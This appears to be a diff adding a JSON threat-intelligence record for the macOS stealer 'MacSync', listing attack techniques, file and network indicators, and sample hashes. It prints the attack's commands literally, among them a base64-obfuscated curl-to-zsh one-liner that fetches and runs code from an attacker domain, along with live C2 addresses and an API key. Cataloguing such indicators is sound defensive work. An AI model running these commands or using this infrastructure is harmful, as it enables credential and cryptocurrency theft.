@@ -1,0 +1,467 @@
+{
+  "malware_family": "MacSync",
+  "threat_actor": "",
+  "platforms": [
+    "macos"
+  ],
+  "summary": "MacSync is a multi-stage macOS stealer and RAT delivered via malvertising campaigns using fake AI-themed install guides. The malware steals a wide range of data including browser credentials, keychain secrets, and cryptocurrency wallets, and can trojanize existing wallet applications to phish for recovery phrases. It establishes persistence with a native Mach-O RAT that communicates over a raw-IP TLS channel.",
+  "mitre_techniques": [
+    "T1059.004",
+    "T1059.002",
+    "T1204",
+    "T1140",
+    "T1027",
+    "T1036",
+    "T1553",
+    "T1548",
+    "T1070.004",
+    "T1555.001",
+    "T1555.003",
+    "T1539",
+    "T1552.001",
+    "T1056.002",
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1113",
+    "T1082",
+    "T1543.001",
+    "T1554",
+    "T1071.001",
+    "T1573.002",
+    "T1571",
+    "T1105",
+    "T1041",
+    "T1567",
+    "T1657"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "curl -kfsSL $(echo 'aHR0cDovL2FnZW50aWNzb3JhLmNvbS9jdXJsL2FhOGIxYTg2YmJiYWE3Zjk3YXU='|base64 -D)|zsh",
+      "context": "Initial access one-liner pasted into Terminal by victim.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl .../dynamic | osascript",
+      "context": "Stage 2 loader fetches and executes the AppleScript stealer in-memory.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "/tmp/macsync_<token>.lock",
+      "context": "Single-instance mutex directory created by the AppleScript stealer.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "osalogging.zip",
+      "context": "Stolen data archive created in /tmp by the AppleScript stealer.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "dscl . authonly '[user]' '<guess>'",
+      "context": "AppleScript validates captured user password without a full login session.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.local/com.apple.a3b73d35.hcpi",
+      "context": "Dropped Mach-O RAT binary (example ID).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.apple.<8hex>.hcpi.plist",
+      "context": "LaunchAgent persistence file for the RAT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.local/.mpwd",
+      "context": "File containing the captured user password, read by the RAT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".kgrab.sh",
+      "context": "Temporary script in /tmp to steal browser Safe Storage keys.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MacSync Stealer",
+      "context": "Self-identifying string in the beacon info file.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "1.1.2_release",
+      "context": "Version string from the beacon info file.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Убрана хрупкая SafeSQLiteCopy (часто падала когда Firefox запущен)",
+      "context": "Russian developer comment in the AppleScript stealer source.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "// ←=== ВСТАВЬТЕ СЮДА ===→",
+      "context": "Russian developer comment marking injection point in wallet trojan JS.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ditto -c -k --sequesterRsrc <staging> /tmp/osalogging.zip",
+      "context": "AppleScript command to archive the stolen data staging directory.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Mon May 18 08:54:01 2026 UTC",
+      "context": "Compile timestamp for bundled OpenSSL library in RAT binary.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "/tmp/openssl-arm64/",
+      "context": "Compile path prefix string in the RAT binary.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "nLbd5Df6CyCZNFDBpxGtBOlfshEr4jdTJ9ZYwxhVahr1tV2EdeZNG6VdNK2O2",
+      "context": "Hardcoded token in RAT for C2 channel encryption key.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ AA }",
+      "context": "Single-byte XOR key for obfuscating strings in the RAT binary.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{\"type\":\"ping\",\"version\":\"",
+      "context": "Format string for RAT's 'ping' beacon message.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{\"type\":\"password\",\"password\":\"",
+      "context": "Format string for RAT's stolen password submission message.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ScreenCap",
+      "context": "Executable name for the screen capture helper.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Screen Recording",
+      "context": "Deceptive CFBundleName used by the capture helper app.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "--tcc-only",
+      "context": "Argument for capture helper to only request TCC permission.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/usr/sbin/screencapture -x '%s'",
+      "context": "Command shelled out by helper to capture the screen.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "recovery-step-1.html",
+      "context": "Phishing page injected into trojanized wallet application bundles.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "recovery-step-1.html.bac",
+      "context": "Unintended backup file left inside the trojanized Trezor bundle.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Full Disk Access required!",
+      "context": "Title of the dialog prompting for Full Disk Access.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "other",
+      "value": "gad_campaignid=23991223358",
+      "context": "Google Ads campaign ID from the initial malvertising URL.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "agenticsora.com",
+      "context": "Primary delivery C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "malwareaudit.com",
+      "context": "Secondary delivery C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.216.221.95",
+      "context": "Operator/panel IP recorded in the stealer's beacon info file.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "85.206.161.241:8443",
+      "context": "Hardcoded raw IP for RAT command and control over TLS.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "main.sdhomeinspectors.com",
+      "context": "Attacker-registered domain for receiving stolen wallet recovery phrases.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "main.southcarolinacounselor.com",
+      "context": "Attacker-registered domain for receiving stolen wallet recovery phrases.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "api-key: 9dd465d26c7d86b4a6f514a4b46b2295",
+      "context": "Static API key required by the delivery C2 server.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/curl/",
+      "context": "Endpoint on delivery C2 for serving the initial zsh loader.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/dynamic",
+      "context": "Endpoint on delivery C2 for serving the main AppleScript stealer.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/gate",
+      "context": "Endpoint on delivery C2 for chunked data exfiltration.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/loader/agent/",
+      "context": "Endpoint on delivery C2 for downloading the Mach-O RAT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/loader/capture-agent/",
+      "context": "Endpoint for downloading the screen capture helper.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/modules/wallets",
+      "context": "Endpoint on drop domains for receiving stolen wallet recovery phrases.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/agent/",
+      "context": "WebSocket path on the raw-IP C2 for RAT communications.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "3db8befc08dc02ab7a76b5193abd81653775e8f3ceac5864c7c2188b2dbd3c54",
+      "description": "Dynamic AppleScript stealer payload (Stage 3)"
+    },
+    {
+      "sha256": "3ae26ed89d3a1a140edc89ca78513aba2895789ed0d0f64cad6605b6f2347c7e",
+      "description": "Agent RAT (universal Mach-O, Stage 4)"
+    },
+    {
+      "sha256": "78dea0693ac2d70bdf8be7588667a75910e43fd84397ad484e710e37369a30f7",
+      "description": "Capture agent bundle (Stage 5)"
+    },
+    {
+      "sha256": "9c09c303fa058c2d3e179969bd58ca5523775ff2d310fb2f8266ac74cb21ee81",
+      "description": "ScreenCap executable from capture agent bundle"
+    },
+    {
+      "sha256": "071bd109208eb1080ef525b5be394244cec467c59ffef5b8782cfb5e4850401d",
+      "description": "Ledger Wallet trojan payload (Stage 6)"
+    },
+    {
+      "sha256": "31566a1df7070f30cb990aa5eab310c1d4e0266c8776e9438138e5438ec1cff8",
+      "description": "Ledger Live trojan payload (Stage 6)"
+    },
+    {
+      "sha256": "230dff4bf9442a951dcd6898b2110924969a20668c20a43e3ceed6fcef65963e",
+      "description": "Trezor Suite trojan payload (Stage 6)"
+    }
+  ],
+  "file_types": [
+    "script",
+    "macho",
+    "archive"
+  ]
+}
